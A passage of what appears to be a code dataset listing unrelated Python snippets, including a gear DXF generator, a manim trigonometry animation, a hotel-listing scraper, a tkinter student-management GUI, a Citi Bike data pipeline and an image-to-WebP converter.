ygear.append(ym)\r\nxgear.append(xgear[0])\r\nygear.append(ygear[0])\r\n\r\nprint(\"\u8acb\u78ba\u8a8d\u9810\u89bd\u5716\uff0c\u78ba\u8a8d\u5b8c\u8acb\u6309X. Please confirm the preview image and press X after confirmation.\")\r\nplt.plot(dx,dy,DbX,DbY,'-.',DpX,DpY,'-.',DaX,DaY,'-.',xgear,ygear)\r\nplt.axis('equal')\r\nplt.title('Gear')\r\nplt.show()\r\n\r\nimport math\r\ndef c2point(start_point,end_point,center=(0,0)):\r\n    start_angle = math.degrees(math.atan2(start_point[1] - center[1], start_point[0] - center[0]))\r\n    end_angle = math.degrees(math.atan2(end_point[1] - center[1], end_point[0] - center[0]))\r\n    return start_angle,end_angle\r\n#ezdxf\r\ndoc = ezdxf.new('R2010')\r\n# \u521b\u5efa\u6a21\u578b\u7a7a\u95f4\r\nmsp = doc.modelspace()\r\n#\u756b\u8ef8\r\nmsp.add_circle(center=(0, 0), radius=d/2)  # \u5728\u6a21\u578b\u7a7a\u9593\u4e2d\u6dfb\u52a0\u4e00\u500b\u534a\u5f91\u70ba5\u7684\u5713\u5f62\r\n#\u756b\u9f52\r\nfor i in range(0,tn):\r\n    theta=np.pi/tn*i*2\r\n    Mr=np.array([[np.cos(theta),-np.sin(theta)],\r\n           [np.sin(theta),np.cos(theta)]],)\r\n    xygear=[]\r\n    xygearMir=[]\r\n    for i in range(len(xyPoints)):\r\n        xygear.append(Mr.dot(xyPoints[i]))\r\n    for i in range(len(xyPointsMir)):\r\n        xygearMir.append(Mr.dot(xyPointsMir[i]))\r\n    if rf>rb:#\u5982\u679c\u9f52\u5e95\u5713\u534a\u5f91>\u57fa\u5713\u534a\u5f91#Ver.1.01\r\n        msp.add_spline(xygear)#\u76f4\u63a5\u756b\u6f38\u958b\u7dda\r\n    else:\r\n        msp.add_line(xygear[0],xygear[1])#\u9f52\u6839\r\n        msp.add_spline(xygear[1:])\r\n    start_angle,end_angle=c2point(xygear[-1],xygearMir[0])#\r\n    msp.add_arc((0,0),ra,start_angle,end_angle)#\u9023\u7d50\u9f52\u9802\r\n    if rf>rb:#\u5982\u679c\u9f52\u5e95\u5713\u534a\u5f91>\u57fa\u5713\u534a\u5f91#Ver.1.01\r\n        msp.add_spline(xygearMir)\r\n    else:\r\n        msp.add_spline(xygearMir[:-2])\r\n        msp.add_line(xygearMir[-2],xygearMir[-1])\r\n\r\n    theta=np.pi/tn*2\r\n    Mr=np.array([[np.cos(theta),-np.sin(theta)],\r\n           [np.sin(theta),np.cos(theta)]],)\r\n    start_angle,end_angle=c2point(xygearMir[-1],Mr.dot(xygear[0]))#\u9023\u63a5\u4e0b\u4e00\u500b\u6f38\u958b\u7dda\u8d77\u9ede\r\n    msp.add_arc((0,0),rf,start_angle,end_angle)#\u9023\u7d50\u9f52\u5e95\r\n#\r\n# \u4fdd\u5b58DXF\u6587\u4ef6\r\ntry:\r\n    fileName=input('\u8acb\u8f38\u5165\u5b58\u6a94\u540d\u7a31:Please enter the name of file:')\r\n    doc.saveas(fileName+'.dxf')\r\n    print('\u9f52\u8f2a\u751f\u6210\u6210\u529f\uff0c\u6a94\u6848\u540d\u7a31\u70ba:'+fileName+'.dxf' )\r",
    "from manimlib import *\nfrom collections import namedtuple\n\nclass Coordinate(namedtuple('Coordinate', ('x', 'y', 'z'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTrianglePoints(namedtuple('UnitTrianglePoints', ('bl', 'br', 'tr'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTriangleEdges(namedtuple('UnitTriangleEdges', ('b', 'r', 'tl'))):\n\t__slots__ = ()  # no idea what this does\n\nclass TrigTriangle(Scene):\n\tdef construct(self):\n\t\t# triangle value trackers\n\t\tangle = ValueTracker(PI/6)\n\t\thypotenuse = ValueTracker(3.7)\n\t\tx = ValueTracker(0)\n\t\ty = ValueTracker(0)\n\n\t\tdef normalize_angle(angle: float):\n\t\t\treturn (angle + TAU * math.ceil(angle / TAU)) % TAU\n\n\t\t# returns normalize angle value tracker\n\t\tdef get_normalized_angle():\n\t\t\treturn normalize_angle(angle.get_value())\n\t\t\n\n\t\tdef get_points():\n\t\t\tbl = x.get_value(), y.get_value(), 0\n\t\t\tbr = x.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(), y.get_value(), 0\n\t\t\ttr = (\n\t\t\t\tx.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\ty.get_value() + math.sin(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn UnitTrianglePoints(Coordinate(*bl), Coordinate(*br), Coordinate(*tr))\n\t\t\n\t\tdef get_dots():\n\t\t\treturn UnitTrianglePoints(*(Dot(i) for i in get_points()))\n\t\t\n\t\tdef get_lines():\n\t\t\tpoints = get_points()\n\t\t\tb = Line(points[0], points[1])\n\t\t\tr = Line(points[1], points[2])\n\t\t\ttl = Line(points[0], points[2])\n\t\t\treturn UnitTriangleEdges(b, r, tl)\n\n\t\talways_redraw_lines = [\n\t\t\talways_redraw(lambda: get_lines().b.set_color(BLUE)),\n\t\t\talways_redraw(lambda: get_lines().r.set_color(RED)),\n\t\t\talways_redraw(lambda: get_lines().tl).set_color(GREY),\n\t\t]\n\n\t\tdef align_mobject_center(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn mobject.rotate(rotation).move_to(pos)\n\t\t\n\t\tdef align_mobject_corner(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\t\t\tif normal_angle < PI/2:\n\t\t\t\tnormal_angle = PI/4\n\t\t\t\tshift = bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < PI:\n\t\t\t\tnormal_angle = 3*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < 3*PI/2:\n\t\t\t\tnormal_angle = 5*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\telse:\n\t\t\t\tnormal_angle = 7*PI/4\n\t\t\t\tshift = bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\tdef align_mobject_corner_interpolate(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\n\t\t\tdef get_shift_val(min_angle: float, max_angle: float, angle: float, max_shift: float):\n\t\t\t\treturn ((angle - min_angle) / (max_angle - min_angle) * 2 - 1) * max_shift\n\n\t\t\tif normal_angle < PI/4 or normal_angle > 7*PI/4:\n\t\t\t\tshift = bounding_box_width / 2, get_shift_val(0, PI/2, normalize_angle(normal_angle+PI/4), bounding_box_height / 2), 0\n\t\t\telif normal_angle < 3*PI/4:\n\t\t\t\tshift = get_shift_val(PI/4, 3*PI/4, normal_angle, -bounding_box_width / 2), bounding_box_height / 2, 0\n\t\t\telif normal_angle < 5*PI/4:\n\t\t\t\tshift = -bounding_box_width / 2, get_shift_val(3*PI/4, 5*PI/4, normal_angle, -bounding_box_height / 2), 0\n\t\t\telse:\n\t\t\t\tshift = get_shift_val(5*PI/4, 7*PI/4, normal_angle, bounding_box_width / 2), -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\t# edge labels\n\t\tedge_label_distance = ValueTracker(0.2)\n\t\tedge_label_size = ValueTracker(6)\n\t\talways_redraw_labels = [\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.x - get_points().bl.x) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().b.get_center(), 0, 3*PI/2 if math.sin(angle.get_value()) > 0 else PI/2, edge_label_distance.get_value()).set_color(BLUE)),\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.y - get_points().tr.y) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().r.get_center(), 3*PI/2 if math.cos(angle.get_value()) > 0 else PI/2, 0 if math.cos(angle.get_value()) > 0 else PI, edge_label_distance.get_value()).set_color(RED)),\n\t\t\t# always_redraw(lambda: redraw_label_function(lambda: f'{round(math.dist",
    "import numpy as np \nimport MDAnalysis\nfrom mpnn_analysis import *\n\nclass res_selection:\n\n\tdef __init__(self, start_structure, cofactor):\n\t\t'''\n\t\tstart_structure (list): list of strings encoding hetatm entries\n\t\t'''\n\t\tself.start_structure = start_structure\n\t\tself.cofactor = cofactor\n\n\tdef find_hetatoms(self):\n\t\t'''\n\t\tFinds and returns a list of unique (non-water) heteroatom names present in the PDB file.\n\n\t\tParameters:\n\t\t\t\t- self: The object itself.\n\n\t\tReturns:\n\t\t\t\t- list: A list of unique heteroatom names found in the PDB file.\n\t\t'''\n\t\twith open (self.start_structure) as pdb:\n\t\t\tpdb_lines = pdb.readlines()\n\t\t\thetatm_name = []\n\t\t\tfor line in pdb_lines:\n\t\t\t\tif line.startswith('HETATM'):\n\t\t\t\t\tif line[17:20] != 'HOH' and line[17:20] not in hetatm_name:\n\t\t\t\t\t\thetatm_name.append(line[17:20].strip(' '))\n\t\tif len(hetatm_name) != 0:\n\t\t\tprint('--- heteroatoms found:',hetatm_name, ' ---')\n\t\treturn hetatm_name\n\t\t\t\t\n\tdef fix_residues(self, angstroem):\n\t\t'''\n\t\tIdentifies residues in close proximity to the specified HETATM (cofactor or a substrate) \n\t\tand returns their indices (0-indexed).\n\n\t\tParameters:\n\t\t\t\t- angstroem (int): The distance in angstroms to consider for identifying nearby residues.\n\n\t\tReturns:\n\t\t\t\t- list: A list of indices of residues in close proximity to the specified cofactor.\n\t\t'''\n\t\thetatoms_list = res_selection.find_hetatoms(self)\n\t\tif len(self.cofactor) == 1:\n\t\t\thetatm = self.cofactor[0]\n\t\t\tif hetatm in hetatoms_list:\n\t\t\t\tindex_cofactor = hetatoms_list.index(hetatm)\n\t\t\tuniverse_start_struct = MDAnalysis.Universe(self.start_structure)\n\t\t\tselection_fix = f'protein and byres around {angstroem} resname {str(hetatoms_list[index_cofactor])}'\n\t\t\tfix_res = universe_start_struct.select_atoms(selection_fix)\n\t\t\tfix_res_data = mpnn_analysis.data_universe(fix_res)\n\t\t\tprint('--- selected fixed residues for pMPNN design around {} ---'.format(hetatm)) \n\t\t\tindices_fix = [i for i in fix_res_data['res_numb']]\n\t\t\treturn list(dict.fromkeys(indices_fix))\n\t\telse:\n\t\t\tindices_fix = []\n\t\t\tfor i in range(len(hetatoms_list)):\n\t\t\t\tif hetatoms_list[i] in self.cofactor:\n\t\t\t\t\thetatm = hetatoms_list[i]\n\t\t\t\t\tindex_cofactor = hetatoms_list.index(hetatm)\n\t\t\t\t\tuniverse_start_struct = MDAnalysis.Universe(self.start_structure)\n\t\t\t\t\tselection_fix = f'protein and byres around {angstroem} resname {str(hetatoms_list[index_cofactor])}'\n\t\t\t\t\tfix_res = universe_start_struct.select_atoms(selection_fix)\n\t\t\t\t\tfix_res_data = mpnn_analysis.data_universe(fix_res)\n\t\t\t\t\tindices_iter = [i for i in fix_res_data['res_numb']]\n\t\t\t\tprint('--- selected fixed residues for pMPNN design around {} ---'.format(hetatm)) \n\t\t\t\tfor i in indices_iter:\n\t\t\t\t\tindices_fix.append(i)\n\t\t\treturn list(dict.fromkeys(indices_fix))",
    "#! pip install pandas undetected_chromedriver bs4 selenium\nfrom selenium.webdriver.support.ui import WebDriverWait\nimport undetected_chromedriver as uc\nfrom bs4 import BeautifulSoup\nimport re\nimport pandas as pd\nimport time\n\nwait_time = 1000\ntimeout = 3000\ntotal_iterations = 20\n# actual url to be scaped\nurl = \"https://www.trip.com/hotels/list?city=220&cityName=Dubai&provinceId=0&countryId=0&districtId=0&checkin=2024%2F04%2F03&checkout=2024%2F04%2F11&crn=1&adult=2&children=0&searchBoxArg=t&travelPurpose=0&ctm_ref=ix_sb_dl&domestic=true&listFilters=17%7C1*17*1*2%2C80%7C0%7C1*80*0*2%2C29%7C1*29*1%7C2*2&locale=en-XX&curr=USD\"\n\nhotel_details = {}\ncity_id = re.split(\"=|&\", url)[1]\ndef scrape_quotes(url):\n    driver = uc.Chrome()\n    driver.get(url)\n    WebDriverWait(driver, timeout, wait_time)\n    initial_html = driver.page_source\n    initial_soup = BeautifulSoup(initial_html, \"html.parser\")\n    initial_quotes = initial_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n    extract_and_print_quotes(initial_quotes)\n    for _ in range(total_iterations):\n        driver.execute_script(\n            \"window.scrollTo(0, document.body.scrollHeight);\")\n        driver.implicitly_wait(10)\n        time.sleep(10)\n        WebDriverWait(driver, timeout, wait_time)\n        scroll_html = driver.page_source\n        scroll_soup = BeautifulSoup(scroll_html, \"html.parser\")\n        scroll_quotes = scroll_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n        extract_and_print_quotes(scroll_quotes)\n    driver.quit()\n\n\ndef extract_and_print_quotes(quotes):\n    for quote in quotes:\n        quote = BeautifulSoup(str(quote), \"html.parser\")\n        hotel_id = quote.find(\"div\", class_=\"compressmeta-hotel-wrap-v8\")[\"id\"]\n        hotel_name = quote.find(\"span\", class_=\"name\").text\n        hotel_details[hotel_name] = (\n            f\"https://www.trip.com/hotels/detail/?cityId={city_id}&hotelId={hotel_id}\"\n        )\n        print(f\"Hotel ID: {hotel_id}\")\n        print(f\"Hotel Name: {hotel_name}\")\n        print(f\"{len(hotel_details)=}\")\n        print(\"----------\")\n\n\nif __name__ == \"__main__\":\n    scrape_quotes(url)\n    print(hotel_details)\n    import pandas as pd\n    pd.DataFrame.from_dict(hotel_details, orient=\"index\").to_csv(\"123.csv\")\n",
    "from tkinter import*\r\nfrom tkinter import ttk\r\nfrom PIL import Image,ImageTk\r\nfrom tkinter import messagebox\r\nimport mysql.connector\r\nimport cv2\r\nimport os\r\nimport numpy as np\r\n\r\n\r\nclass Student:\r\n    def __init__(self,root):\r\n        self.root=root\r\n        self.root.geometry(\"1300x790+0+0\")\r\n        self.root.title(\"face Recognition System\")\r\n        \r\n        \r\n        #================= variables=========\r\n        self.var_dep=StringVar()\r\n        self.var_course=StringVar()\r\n        self.var_year=StringVar()\r\n        self.var_semester=StringVar()\r\n        self.va_std_id=StringVar()\r\n        self.var_std_name=StringVar()\r\n        self.var_div=StringVar()\r\n        self.var_roll=StringVar()\r\n        self.var_gender=StringVar()\r\n        self.var_dob=StringVar()\r\n        self.var_email=StringVar()\r\n        self.var_phone=StringVar()\r\n        self.var_address=StringVar()\r\n        self.var_teacher=StringVar()\r\n        \r\n        #1st \r\n        img=Image.open(r\"college_images\\a5.jpg\")\r\n        img=img.resize((500,130),Image.ANTIALIAS)\r\n        self.photoimg=ImageTk.PhotoImage(img)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg)\r\n        f_lbl.place(x=0,y=0,width=500,height=130)\r\n        \r\n        #2nd\r\n        img1=Image.open(r\"college_images\\a4.jpg\")\r\n        img1=img1.resize((500,130),Image.ANTIALIAS)\r\n        self.photoimg1=ImageTk.PhotoImage(img1)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg1)\r\n        f_lbl.place(x=500,y=0,width=500,height=130)\r\n        \r\n        #3rd\r\n        img2=Image.open(r\"college_images\\a2.jpg\")\r\n        img2=img2.resize((550,130),Image.ANTIALIAS)\r\n        self.photoimg2=ImageTk.PhotoImage(img2)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg2)\r\n        f_lbl.place(x=1000,y=0,width=550,height=130)\r\n        \r\n        #big image\r\n        img3=Image.open(r\"college_images\\a6.jpg\")\r\n        img3=img3.resize((1300,710),Image.ANTIALIAS)\r\n        self.photoimg3=ImageTk.PhotoImage(img3)\r\n        \r\n        bg_img=Label(self.root,image=self.photoimg3)\r\n        bg_img.place(x=0,y=130,width=1300,height=710)\r\n        \r\n        title_lbl=Label(bg_img,text=\"STUDENT MANAGEMENT SYSTEM\",font=(\"times new roman\",35,\"bold\"),bg=\"red\",fg=\"blue\")\r\n        title_lbl.place(x=0,y=0,width=1300,height=45)\r\n        \r\n        main_frame=Frame(bg_img,bd=2,bg=\"white\")\r\n        main_frame.place(x=10,y=55,width=1250,height=600)\r\n        \r\n        # left lable frame\r\n        Left_frame=LabelFrame(main_frame,bd=2,bg=\"white\",relief=RIDGE,text=\"Student Details\",font=(\"times new roman\",12,\"bold\"))\r\n        Left_frame.place(x=10,y=10,width=610,height=440)\r\n        \r\n        img_left=Image.open(r\"college_images\\a2.jpg\")\r\n        img_left=img_left.resize((610,130),Image.ANTIALIAS)\r\n        self.photoimg_left=ImageTk.PhotoImage(img_left)\r\n        \r\n        f_lbl=Label(Left_frame,image=self.photoimg_left)\r\n        f_lbl.place(x=0,y=0,width=608,height=130)\r\n        \r\n        \r\n        #current course\r\n        current_course_frame=LabelFrame(Left_frame,bd=2,bg=\"white\",relief=RIDGE,text=\"Current course information\",font=(\"times new roman\",12,\"bold\"))\r\n        current_course_frame.place(x=0,y=10,width=608,height=140)\r\n        \r\n        #Department\r\n        dep_label=Label(current_course_frame,text=\"Department\",font=(\"times new roman\",12,\"bold\"),bg=\"white\")\r\n        dep_label.grid(row=0,column=0,padx=10)\r\n        \r\n        dep_combo=ttk.Combobox(current_course_frame,textvariable=self.var_dep,font=(\"times new roman\",12,\"bold\"),state=\"readonly\")\r\n        dep_combo[\"values\"]=(\"Select Department\",\"CSE\",\"ECE\",\"IT\",\"ME\",\"MBA\",\"BCA\",\"BBA\")\r\n        dep_combo.current(0)\r\n        dep_combo.grid(row=0,column=1,padx=2,pady=10)\r\n        \r\n        # Course\r\n        Course_label=Label(current_course_frame,text=\"Course\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Course_label.grid(row=0,column=2,padx=10,sticky=W)\r\n        \r\n        Course_combo=ttk.Combobox(current_course_frame,textvariable=self.var_course,font=(\"times new roman\",13,\"bold\"),state=\"readonly\")\r\n        Course_combo[\"values\"]=(\"Select Course \",\"B.Tech\",\"MBA\",\"BA\",\"B.Sc\")\r\n        Course_combo.current(0)\r\n        Course_combo.grid(row=0,column=3,padx=2,pady=10,sticky=W)\r\n        \r\n        # Year\r\n        Year_label=Label(current_course_frame,text=\"Year\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Year_label.grid(row=1,column=0,padx=10,sticky=W)\r\n        \r\n        Year_combo=ttk.Combobox(current_course_frame,textvariable=self.var_year,font=(\"times new roman\",13,\"bold\"),state=\"readonly\")\r\n        Year_combo[\"values\"]=(\"Select Year \",\"2021-22\",\"2022-23\",\"2023-24\",\"2024-25\")\r\n        Year_combo.current(0)\r\n        Year_combo.grid(row=1,column=1,padx=2,pady=10,sticky=W)\r\n        \r\n        # Semester\r\n        Semester_label=Label(current_course_frame,text=\"Semester\",font=(\"times new roman\",13,\"bold\"),bg=\"white\")\r\n        Semester_label.grid(row=1,column=2,padx=10,sticky=W)\r\n        \r\n        Semester_combo=ttk.Combobox(curren",
    "import requests\nfrom requests.exceptions import HTTPError\nimport zipfile\nimport io, sys, os, time\nimport dlt\nimport pyarrow as pa\nimport pyarrow.csv as pa_csv\n\nos.environ[\"SCHEMA__NAMING\"] = \"direct\"\n\nYEARS = [19, 20, 23]\n\ndef download_citi_data(year):\n    url = f\"https://s3.amazonaws.com/tripdata/20{year}-citibike-tripdata.zip\"\n    tables = []\n    \n    try:\n        response = requests.get(url, stream=True)\n        response.raise_for_status()\n\n        zip_data = io.BytesIO(response.content)\n\n        print(\"downloaded and extracted zip file\")\n\n        # Read CSV files in monthly folders\n        with zipfile.ZipFile(zip_data, 'r') as zip_ref:\n            for file_name in zip_ref.namelist():\n                if file_name.endswith('.csv') and not file_name.startswith('__MACOSX'):\n                    print(f\"Reading {file_name}\")\n\n                    with zip_ref.open(file_name) as f:\n                        # Specifying data types for mixed columns\n                        convert_options = pa.csv.ConvertOptions(column_types={\n                            'start_station_id': pa.string(),\n                            'end_station_id': pa.string()\n                        })\n\n                        table = pa_csv.read_csv(f, convert_options=convert_options)\n                        tables.append(table)\n    except HTTPError as http_err:\n        print(f\"HTTP error occurred: {http_err}\")\n        sys.exit(1)\n    except Exception as err:\n        print(f\"An error occurred: {err}\")\n        sys.exit(1)\n\n    return tables\n\n\nfor year in YEARS:\n    pipeline = dlt.pipeline(\n        pipeline_name=f\"citi-20{year}\",\n        destination=\"filesystem\",\n        dataset_name=f\"citi_data_20{year}\"\n    )\n\n    tables = download_citi_data(year)\n    combined_table = pa.concat_tables(tables)\n\n    print(\"Combined tables done. Attempting to convert to parquet and upload to GCS bucket\")\n\n    pipeline.run(\n        combined_table,\n        table_name=f\"citi_bike_20{year}-tester\",\n        loader_file_format=\"parquet\",\n        write_disposition='replace',\n        progress=\"tqdm\"\n    )\n\n    print(\"Success! Uploaded parquet to GCS!\")\n    print(\"Pausing for 10 seconds\")\n\n    time.sleep(10)",
    "import math\n\n\ndef verifica_operador():\n    print(\"-\"*30)\n    print(\"C = para limpar x = mult, / = div, * = poten, + = adi\u00e7\u00e3o  , - = subtra\u00e7\u00e3o\"\n          \" R = raiz, % = porcent -----  Sair = Fechar calculadora\")\n    print(\"-\"*30)\n    esc_operacao = str(input(\"Digite o operador que deseja usar: \"))\n    print()\n    if esc_operacao in ['+','-','x','X','/','*',\"R\",'%','C','c','SAIR','Sair','sair']:\n        return esc_operacao\n        \n    else:\n        print(\"-\"*30)\n        print(\"Digite um operador v\u00e1lido\")\n        verifica_operador()\n\n\ndef multiplicacao(num1,num2,resultado):\n    resultado = num1 * num2\n    return resultado\n\n\ndef div(num1,num2,resultado):\n    resultado = num1 / num2\n    return resultado\n\n\ndef potencia(num1,num2,result):\n    result = num1 ** num2\n    return result\n\n\ndef raiz(num1, resultado):\n    resultado = math.sqrt(num1)\n    return resultado\n\n\ndef porcentagem(num1,num2, resultado):\n    resultado = (num1 / 100) * num2\n    return resultado\n\n\ndef soma(num1,num2,result):\n    result = num1 + num2\n    return result\n\n\ndef sub(num1, num2, resultado):\n    resultado = num1 - num2\n    return resultado\n\n\nwhile True:\n    #Entrada de dados efetuada pelo cliente\n    print(\"-\"*30)\n    num1 = float(input(\"Digite o primeiro n\u00famero: \"))\n    \n    while True:#loop para continuar utilizando o resultado\n        operador = verifica_operador()#Entrada e verifica\u00e7\u00e3o se o operador \u00e9 valido\n        if operador == 'R':\n            pass\n        elif operador == 'C' or operador == 'c':\n            print(\"Numero deletado\")\n            break\n        elif operador in ['sair', 'SAIR','Sair']:\n            break\n        else:\n            num2 = float(input(\"Digite o segundo n\u00famero: \"))\n        print(\"-\"*30)\n\n\n        #Verifica\u00e7\u00e3o do operador e resolu\u00e7\u00e3o da opera\u00e7\u00e3o matem\u00e1tica\n        resultado = None\n        if operador == 'x' or operador == 'X':\n            resultado = multiplicacao(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n\n        elif operador == '/':\n            resultado = div(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n\n        elif(operador == '*'):\n            resultado = potencia(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")  \n            num1 = resultado\n\n        elif(operador == 'R'):\n            resultado = raiz(num1,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n\n        elif(operador == '+'):\n            resultado = soma(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n\n        elif(operador == '-'):\n            resultado = sub(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n\n        else:\n            resultado = porcentagem(num1,num2,resultado)\n            print(f\"Resultado: {resultado}\")\n            num1 = resultado\n        \n\n    if operador in ['Sair','sair','SAIR']:#Verifica se o usu\u00e1rio deseja sair e fecha o sistema ou continua\n        print(\"FECHANDO O SISTEMA\")\n        break\n    else:\n        pass\n",
    "from cmind import utils\nimport os\nimport shutil\n\ndef preprocess(i):\n    os_info = i['os_info']\n\n    env = i['env']\n    script_path=i['run_script_input']['path']\n\n    env[\"CM_SOURCE_FOLDER_PATH\"] = script_path\n    env['CM_CXX_SOURCE_FILES'] = \"main.cpp\"\n    env['CM_SOURCE_FOLDER_PATH'] = os.path.join(script_path, \"src\")\n\n    env['CM_LINKER_LANG'] = 'CXX'\n\n    if 'CM_RUN_DIR' not in env:\n        env['CM_RUN_DIR'] = os.path.join(script_path, \"output\")\n\n    if not os.path.isdir(env['CM_RUN_DIR']):\n        os.makedirs(env['CM_RUN_DIR'])\n\n    if os_info['platform'] == 'windows':\n        env['CM_BIN_NAME']='test-ort.exe'\n    else:\n        env['CM_BIN_NAME']='test-ort'\n        env['+ LDCFLAGS'] = [\"-lm\"]\n\n    # e.g. -lonnxruntime\n    if env.get('CM_BACKEND','')=='onnxruntime':\n        x = env['CM_ONNXRUNTIME_LIB_PATH']+'\\\\onnxruntime.lib' if os_info['platform'] == 'windows' else '-lonnxruntime'\n\n        if '+ LDCXXFLAGS' not in env:\n            env['+ LDCXXFLAGS'] = []\n        env['+ LDCXXFLAGS'].append(x)\n\n    # On Windows we may need to copy onnxruntime.dll to the bin directory\n    # otherwise the one from Windows sytem directory is always taken\n    # even if we update the PATH!\n    if os_info['platform'] == 'windows':\n        path_to_onnx_dll = os.path.join(env['CM_ONNXRUNTIME_LIB_PATH'], 'onnxruntime.dll')\n\n        shutil.copy(path_to_onnx_dll, 'output/onnxruntime.dll')\n\n    return {'return':0}\n\ndef postprocess(i):\n\n    env = i['env']\n\n    return {'return':0}\n",
    "from typing import List\nfrom fastapi import FastAPI, HTTPException\nimport requests\nfrom collections import deque\n\napp = FastAPI()\n\n\nWINDOW_SIZE = 10\nTEST_SERVER_URL = \"http://20.244.56.144/test/rand\" # test diffrent api endpoints\n\n\nnumber_window = deque()\n\n@app.get(\"/numbers/{number_id}\", response_model=dict)\nasync def get_numbers(number_id: str):\n    try:\n\n        response = requests.get(TEST_SERVER_URL.format(number_id=number_id))\n        response.raise_for_status()\n        numbers = response.json()\n    except (requests.exceptions.RequestException, ValueError):\n        raise HTTPException(status_code=503, detail=\"Failed to fetch numbers from the test server.\")\n\n\n    for number in numbers:\n        if number not in number_window:\n            number_window.append(number)\n            if len(number_window) > WINDOW_SIZE:\n                number_window.popleft()\n\n\n    avg = sum(number_window) / len(number_window) if number_window else 0\n\n\n    response_data = {\n        \"numbers\": numbers,\n        \"windowPrevState\": list(number_window)[:-len(numbers)],\n        \"windowCurrState\": list(number_window),\n        \"avg\": avg\n    }\n\n    return response_data",
    "# Instalar Librer\u00eda pillow antes de ejecutar\n# pip install pillow\nfrom PIL import Image\nimport os\n\n\ndef convert_to_webp(image_path, image_out_path):\n    try:\n        # Abrir imagen\n        img = Image.open(image_path)\n\n        # Construir nombre del archivo de salida\n        output_filename = os.path.splitext(os.path.basename(image_path))[0] + \".webp\"\n        output_path = os.path.join(image_out_path, output_filename)\n        # Convert the image to webp format\n        img.save(output_path, \"WEBP\")\n        print(f\"Converted {image_path} to {output_path}\")\n    except Exception as e:\n        print(f\"Error converting {image_path}: {e}\")\n\n\ndef convert_images_in_directory(directory, output_dir):\n    # Buscar todos los archivos del directorio\n    for filename in os.listdir(directory):\n        if filename.endswith(\".jpg\") or filename.endswith(\".png\"):\n            # Convertir cada imagen a webp\n            convert_to_webp(os.path.join(directory, filename), output_dir)\n\n\n# Directorio actual del script\nscript_directory = os.path.dirname(os.path.abspath(__file__))\n\n# Define las rutas relativas para el directorio de entrada y salida\nin_directory_path = os.path.join(script_directory, \"Entrada\")\nout_directory_path = os.path.join(script_directory, \"Salida\")\n\n# Convertir im\u00e1genes en el directorio de entrada y guardarlas en el directorio de salida\nconvert_images_in_directory(in_directory_path, out_directory_path)",
